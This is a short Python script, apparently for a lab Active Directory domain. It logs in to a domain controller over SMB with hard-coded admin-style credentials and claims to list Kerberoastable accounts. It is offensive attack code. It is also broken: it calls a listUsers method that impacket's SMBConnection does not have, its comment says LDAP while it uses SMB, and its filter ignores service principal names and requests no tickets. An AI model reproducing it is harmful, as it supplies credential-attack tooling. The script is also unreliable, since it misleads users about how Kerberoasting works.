from impacket.smbconnection import SMBConnection
from impacket.smb3structs import SMB2_DIALECT_002, SMB2_DIALECT_21

def kerberoast(username, password, domain, dc_ip):
    try:
        # Connect to the domain controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Query LDAP for kerberoastable users
        _, entries = smb.listUsers()

        # Filter kerberoastable users
        kerberoastable_accounts = [entry['name'] for entry in entries if entry['userSid'] and 'krbtgt' not in entry['name']]

        if kerberoastable_accounts:
            print("Kerberoastable Accounts:")
            for account in kerberoastable_accounts:
                print(account)
        else:
            print("No kerberoastable accounts found.")

        smb.logoff()

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)